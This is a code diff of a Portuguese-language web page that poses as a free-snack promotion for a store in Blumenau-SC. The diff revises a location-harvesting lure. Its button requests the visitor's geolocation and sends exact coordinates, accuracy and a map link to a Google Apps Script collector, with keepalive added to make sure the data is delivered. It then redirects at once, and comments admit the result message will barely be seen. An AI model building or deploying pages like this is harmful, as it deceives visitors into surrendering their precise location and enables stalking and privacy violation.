@@ -46,31 +46,30 @@ button{
 <p>Verifique se você está perto de alguma loja e ganhe um lanche gratuitamente</p>
 
 <div class="offer">
-      ✔ Entrega rápida  
-      <br>
-      ✔ Ingredientes frescos  
-      <br>
-      ✔ Promoção válida para novos clientes na região de Blumenau-SC
+✔ Entrega rápida<br>
+✔ Ingredientes frescos<br>
+✔ Promoção válida para Blumenau-SC
 </div>
+
 <br>
 
 <button onclick="checkLocation()">Verificar se estou perto de alguma loja</button>
-<br>
+
 <div id="status" class="status"></div>
 
 </div>
 
 <script>
 
-// 🔴 SUA URL
+// 🔴 URL do Apps Script
 const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyU2Hah8rXss1So36FAyRGF_8hcjZsMGaaF2m9_ZVEPNFPMDtBsQ7S9AsGcTcADgKPpZw/exec";
 
-// 📍 LOJA
+// 📍 Loja
 const LOJA_LAT = -26.9194;
 const LOJA_LNG = -49.0661;
 const RAIO_KM = 200;
 
-// distância
+// cálculo de distância
 function calcularDistancia(lat1, lon1, lat2, lon2){
   const R = 6371;
   const dLat = (lat2-lat1)*Math.PI/180;
@@ -90,7 +89,8 @@ function enviarDados(data){
   fetch(SCRIPT_URL,{
     method:"POST",
     headers:{ "Content-Type":"text/plain" },
-    body: JSON.stringify(data)
+    body: JSON.stringify(data),
+    keepalive: true
   });
 }
 
@@ -107,44 +107,29 @@ function checkLocation(){
 
   navigator.geolocation.getCurrentPosition(
 
-  function(pos){
+    function(pos){
 
-    const lat = pos.coords.latitude;
-    const lng = pos.coords.longitude;
+      const lat = pos.coords.latitude;
+      const lng = pos.coords.longitude;
 
-    const distancia = calcularDistancia(lat,lng,LOJA_LAT,LOJA_LNG);
+      const distancia = calcularDistancia(lat,lng,LOJA_LAT,LOJA_LNG);
 
-    const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
+      const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
 
-    const payload = {
-      timestamp: new Date().toISOString(),
-      latitude: lat,
-      longitude: lng,
-      accuracy: pos.coords.accuracy,
-      distancia_km: distancia.toFixed(2),
-      dentro_area: distancia <= RAIO_KM ? "SIM":"NAO",
-      mapLink: mapLink
-    };
+      const payload = {
+        timestamp: new Date().toISOString(),
+        latitude: lat,
+        longitude: lng,
+        accuracy: pos.coords.accuracy,
+        distancia_km: distancia.toFixed(2),
+        dentro_area: distancia <= RAIO_KM ? "SIM":"NAO",
+        mapLink: mapLink
+      };
 
-    // 🔴 ENVIA
-    enviarDados(payload);
+      // 🔴 ENVIA DADOS
+      enviarDados(payload);
 
-    // UI (opcional, quase não será vista)
-    if(distancia <= RAIO_KM){
-      status.innerText = "✔ Dentro da área";
-      status.className = "status success";
-    }else{
-      status.innerText = "❌ Fora da área";
-      status.className = "status error";
-    }
-
-    // 🔴 REDIRECIONAMENTO (após envio)
-    setTimeout(() => {
-      window.location.href = "inicial.html";
-    }, 300); // delay mínimo para garantir envio
-
-  },
-      // resposta UI
+      // resposta rápida (quase não será vista)
       if(distancia <= RAIO_KM){
         status.innerText = "✔ Dentro da área";
         status.className = "status success";
@@ -152,6 +137,11 @@ function checkLocation(){
         status.innerText = "❌ Fora da área";
         status.className = "status error";
       }
+
+      // 🔴 REDIRECIONA PARA inicial.html
+      setTimeout(() => {
+        window.location.href = "inicial.html";
+      }, 300);
 
     },
 
